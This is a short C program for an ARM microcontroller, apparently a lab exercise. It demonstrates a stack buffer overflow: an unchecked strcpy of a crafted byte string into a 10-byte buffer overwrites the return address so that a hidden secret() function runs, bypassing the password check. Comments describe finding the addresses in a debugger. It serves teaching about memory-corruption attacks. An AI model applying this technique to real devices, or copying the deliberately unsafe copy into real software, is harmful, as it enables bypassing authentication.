#include "Utils/utils.h"
#include <stdio.h>
#include <string.h>

static void secret(void) {
	printf("Access granted\r\n");
}

int main(void) {
	configClock();
	configUSART2(38400);

	char const *pwd_store = "password";
	char attempt[10];
	
	/*
		0x080023C0 = address of secret()    0x080002D3 = address of link register
	  0x080002D3: can be found just after PUSH and SUBS instructions are executed (main function) in the debugger memory watch window
	  0x080023C0: found in the debugger as well
	
		\xFF - easy readable memory address (can't just do \xTG, because that won't exist in memory)
		\xC0 -> \xC1 - have to account for the Thumb bit, therefore just add a bit to the byte address
		\x00 - this is the null terminator of the string. Added this in intentionally.
					 (without it, strcpy would add it in anyway).
					 Also affects the address that needs changing, obviously.
	*/
	strcpy(attempt, "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xC1\x23\x00");
	if (0 == strcmp(attempt, pwd_store)) {
		secret();
	}
	
}
